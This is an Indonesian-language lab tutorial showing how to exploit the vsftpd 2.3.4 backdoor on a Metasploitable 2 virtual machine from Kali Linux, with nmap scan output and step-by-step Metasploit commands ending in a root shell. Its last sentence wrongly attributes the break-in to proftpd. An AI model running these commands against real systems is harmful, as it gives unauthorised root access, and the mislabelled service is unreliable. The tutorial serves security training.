---
title: "Exploit Celah Keamanan Vsftpd di Linux"
date: 2018-11-16T06:05:36+07:00
draft: false
---
## Persiapan



1.  Komputer/Laptop dengan memori minimal 2GB
1.  Metasploit VM Linux
1.  Kali Linux


### Import VM Kali linux

Untuk import file ova kali linux, masuk ke aplikasi virtualbox - klik file - import appliance - pilih file OVA yang akan diimport. Caranya seperti gambar berikut:

Selanjutnya ikutin saja langkah-langkahnya. Setelah berhasil diimport matikan USB mode VM melalui preferences.


### Import VM Metasploit 2

Download terlebih dahulu VM Linux metasploit 2. Untuk membuat VM baru, klik new - isi nama VM - pilih lokasi hardisk (pilih file VMDK yang akan digunakan). Setelah kedua VM berhasil dibuat, selanjutnya anda perlu melakukan konfigurasi network.


#### Konfigurasi jaringan

Pada konfigurasi virtualbox, kedua VM dibuat mode network bridge - pilih nama interface ethernet anda. Bisa dilihat seperti gambar dibawah ini:

Setelah selesai konfigurasi, anda dapat menjalankan kedua VM dan setelah masuk catatlah IP dari kedua VM tersebut. Gunakan perintah **ifconfig** untuk melihat IP dari VM tersebut. Dalam model praktik diatas IP VM kali linux adalah **192.168.1.7** dan IP VM Linux Metasploit (MSF) adalah **192.168.1.8**. _Alamat IP address bisa berbeda setiap mesin, jadi sebaiknya anda sesuaikan dengan kondisi konfigurasi jaringan anda_.


## Praktik

Dalam praktik ini akan dilakukan simulasi untuk exploitasi kelemahan dari layanan yang memanfaatkan protokol FTP.


### Scanning celah pada linux MSF

Proses scanning digunakan untuk mencari informasi terkait layanan apa saja yang terbuka port nya dan memiliki celah keamanan. 


```
root@kali:~# nmap -sC -sT -sV -O -p 21,2121 -T5 192.168.1.8

Starting Nmap 7.60 ( https://nmap.org ) at 2018-11-11 08:48 EST
Nmap scan report for 192.168.1.8 (192.168.1.8)
Host is up (0.00036s latency).

PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 192.168.1.7
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
2121/tcp open  ftp     ProFTPD 1.3.1
MAC Address: 08:00:27:20:AA:71 (Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.9 - 2.6.33
Network Distance: 1 hop
Service Info: OS: Unix

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.04 seconds
```


Jika diamati dari hasil tersebut, ada 2 layanan ftp yang berjalan. Vsftp dan proftpd, keduanya berjalan di port yang berbeda yaitu 21 dan 2121. 

Selanjutnya, jalankan metaspoit console di Kali Linux.


### Exploit vsftp

Jika anda ingin mencari exploit untuk aplikasi vsftp bisa menggunakan perintah berikut:


```
msf > search vsftp

Matching Modules
================

   Name                                  Disclosure Date  Rank       Description
   ----                                  ---------------  ----       -----------
   exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  VSFTPD v2.3.4 Backdoor Command Execution
```


Selanjutnya menggunakan exploit tersebut dengan menggunakan perintah `use <nama exploit>`. 

Contoh: 


```
msf > use exploit/unix/ftp/vsftpd_234_backdoor
msf exploit(vsftpd_234_backdoor) > 
```


Kemudian jalankan` show option` untuk melihat opsi yang tersedia. RHOST adalah alamat ip target, RPORT adalah alamat port target. Selanjutnya untuk  Menentukan alamat ip target (sesuaikan ip target anda), gunakan perintah berikut:


```
msf exploit(vsftpd_234_backdoor) > set rhost 192.168.1.8
rhost => 192.168.1.8
msf exploit(vsftpd_234_backdoor) > 
```


Selanjutnya untuk melakukan proses exploitasi celah keamanan terhadap target, anda bisa gunakan perintah :


```
msf exploit(vsftpd_234_backdoor) > exploit

[*] 192.168.1.8:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 192.168.1.8:21 - USER: 331 Please specify the password.
[+] 192.168.1.8:21 - Backdoor service has been spawned, handling...
[+] 192.168.1.8:21 - UID: uid=0(root) gid=0(root)
[*] Found shell.
[*] Command shell session 1 opened (192.168.1.7:38653 -> 192.168.1.8:6200) at 2018-11-11 09:39:26 -0500

whoami
root
```


Setelah anda mendapatkan command shell, anda dapat memasukkan perintah sistem linux, pada contoh diatas saya menggunakan perintah "whoami". Dalam tahap ini sebenarnya anda sudah berhasil masuk ke sistem linux MSF dengan memanfaatkan celah keamanan / bugs pada proftpd.



